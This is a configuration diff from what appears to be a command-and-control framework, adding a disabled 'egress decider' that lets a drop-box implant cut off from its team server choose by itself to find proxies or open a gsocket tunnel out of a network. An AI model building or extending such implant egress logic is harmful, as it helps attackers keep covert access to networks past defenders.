@@ -208,6 +208,56 @@ c2:
       # and then tries to register over it in the same pass.
       ready_timeout_seconds: 20
 
+  # ── Egress decider: THIS HOST DECIDING FOR ITSELF AS A CLIENT ──
+  #
+  # The client side, like c2.fallback above it. What an implant that cannot
+  # reach its team server may try on its own, in this order, when no operator
+  # and no server-side model can be reached to decide for it. The thing that
+  # normally decides -- the agent's `try_egress` -- sits on the far side of
+  # exactly the connection being established, so when the device is dropped
+  # it cannot be asked. This block is the fallback for that one case, and it
+  # is for nothing else.
+  #
+  # Read docs/EGRESS_DECIDER.md before enabling it. Every row here is an
+  # action the implant takes with nobody watching, and the gate on what a
+  # row may try is in the beacon's code and not in this file: configuration
+  # chooses from three verbs and orders them, and cannot add a fourth. In
+  # particular it may never `sleep` -- the one verb the server-side model
+  # reaches for on a stuck beacon, and the one an implant deciding for
+  # itself must not have.
+  #
+  # Drop-box only. A build the team server generates carries no decider and
+  # reads none of this; this block is read by the Pi's beacon from the file,
+  # like c2.fallback above.
+  #
+  # Ships disabled: a fresh checkout decides nothing. The rules below are a
+  # draft the operator can switch on by changing one word, and they are
+  # validated whether the block is enabled or not, so a typo surfaces now
+  # rather than on the stuck cycle it would have fired.
+  egress_decider:
+    enabled: false
+    # At most this many autonomous attempts per stuck window. The window
+    # closes -- and the budget is refilled -- when any upstream leg
+    # delivers. Three, one per verb.
+    budget: 3
+    # The first rule whose condition holds, and whose verb this build can
+    # run, is the one attempt. A `when` lists the rescue classes of named
+    # transports, the record's flags, or `any` transport carrying one of a
+    # set of classes; several keys in one `when` all have to hold.
+    rules:
+      # A proxy answered but refused us: re-run discovery for another.
+      - when: {https: [auth_required, http_status]}
+        try: rediscover
+      # Discovery has already found a proxy we are not using: select it.
+      - when: {flags: [proxy_found]}
+        try: proxy
+      # Nothing out there answered at all: bring the gsocket carrier up now
+      # rather than waiting for the latch. A first rule of `gsocket` instead
+      # would bring it up a cycle sooner, at the cost of not trying a proxy
+      # first -- see the one-cycle cost in docs/EGRESS_DECIDER.md.
+      - when: {any: [timed_out, unreachable]}
+        try: gsocket
+
   beacon_interval_seconds: 300
   jitter_percent: 20
   # The shared secret for beacon traffic: a base64-encoded 32-byte AES-256-GCM
